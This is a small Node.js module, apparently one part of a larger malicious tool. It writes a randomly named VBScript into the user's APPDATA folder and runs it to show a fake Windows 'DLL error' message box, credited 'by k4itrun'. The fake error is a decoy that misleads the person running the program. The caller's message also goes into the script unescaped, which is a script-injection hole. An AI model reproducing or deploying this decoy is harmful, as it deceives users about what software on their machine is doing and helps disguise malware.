import { exec } from "child_process";
import { Buffer } from "buffer";
import fs from "fs";
import { unique_id, place } from "./../../utils/functions/functions.mjs";

export const fake_error = async (message, config) => {
    try {
        let vbs = `${process.env.APPDATA}\\${unique_id()}.vbs`;
        fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${message === "" ? "DLL error by k4itrun" : message}", vbInformation, "Error Code: 43"`, "utf8");
        exec(`cscript ${vbs}`, (err, stdout, stderr) => {
            if (err) {
                console.error(err)
            }
        });
    } catch (error) {
        console.error(error);
    }
};
